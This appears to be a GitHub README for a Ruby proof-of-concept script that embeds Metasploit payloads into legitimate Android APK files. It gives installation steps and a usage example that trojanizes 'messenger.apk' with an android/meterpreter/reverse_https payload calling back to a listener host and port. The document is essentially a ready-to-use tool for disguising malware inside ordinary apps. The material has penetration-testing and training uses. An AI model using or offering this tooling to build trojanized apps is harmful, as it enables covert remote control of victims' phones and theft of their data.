# metasploit-apk-embed-payload
Embed a Metasploit Payload in an Original .Apk File
<br />
> I choose a lazy person to do a hard job. Because a lazy person will find an easy way to do it.
 
  — [Bill Gates](http://www.goodreads.com/quotes/568877-i-choose-a-lazy-person-to-do-a-hard-job)
 
**This script is a POC for injecting metasploit payloads on arbitrary APKs and Result of [How to Embed a Metasploit Payload in an Original .Apk File](http://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-0166901/) Lesson**
**Authored by timwr, Jack64 , Updated by [xC0d3rZ](https://xc0d3rz.github.io/whoaim)**
###Installation
```bash
 gem install bundler
 bundler install
``` 
###Requirements 
 
 1. Ruby (**> 1.8.7**).
 2. Android SDK(** For injection **)
 
###Warring 
Don't edit or remove **embed_tools** folder.
Don't remove or edit **tmp/*** folder until script finish Embedding 
###Usage
```bash
./run [target.apk] [msfvenom options]
```
<br>
e.g
```bash
./run messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443
```

